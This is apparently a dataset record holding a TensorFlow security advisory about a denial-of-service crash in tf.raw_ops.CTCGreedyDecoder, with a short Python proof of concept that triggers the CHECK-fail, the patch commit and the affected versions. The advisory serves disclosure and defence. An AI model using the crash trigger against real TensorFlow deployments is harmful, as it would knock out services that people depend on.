{"description": "### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.CTCGreedyDecoder`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)\nsequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)\nmerge_repeated = False\n\ntf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)\n```\n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1615440b17b364b875eb06f43d087381f1460a65/tensorflow/core/kernels/ctc_decoder_ops.cc#L37-L50) has a `CHECK_LT` inserted to validate some invariants. When this condition is false, the program aborts, instead of returning a valid error to the user. This abnormal termination can be weaponized in denial of service attacks.\n\n### Patches \nWe have patched the issue in GitHub commit [ea3b43e98c32c97b35d52b4c66f9107452ca8fb2](https://github.com/tensorflow/tensorflow/commit/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n                      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.        \n                      \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Trigger a denial of service via a CHECK-fail in `tf.raw_ops.CTCGreedyDecoder`."]}
